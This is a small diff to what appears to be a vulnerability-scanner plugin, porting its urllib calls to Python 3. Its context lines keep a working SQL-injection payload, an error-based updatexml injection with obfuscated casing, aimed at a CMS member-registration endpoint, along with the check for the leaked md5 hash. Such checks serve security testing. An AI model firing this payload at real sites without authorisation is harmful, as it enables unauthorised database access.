@@ -12,7 +12,7 @@ def assign(service, arg):
 
 
 def audit(arg):
-    import urllib
+    import urllib.request, urllib.parse, urllib.error
     target = "index.php?m=member&f=register_save"
     data = {
         "username": "sss' And 1 like(updAtexml(1,concat(0x5e24,(Select concat(md5(123),0x3a,0x3a)),0x5e24),1))#",
@@ -22,7 +22,7 @@ def audit(arg):
         "fileds[email]": "",
         "submit": " ? ? "
     }
-    payload = urllib.urlencode(data)
+    payload = urllib.parse.urlencode(data)
 
     code, head, res, errcode, _ = curl.curl('-d %s %s' % (payload, target))
     if code == 200 and "ac59075b964b0715" in res:
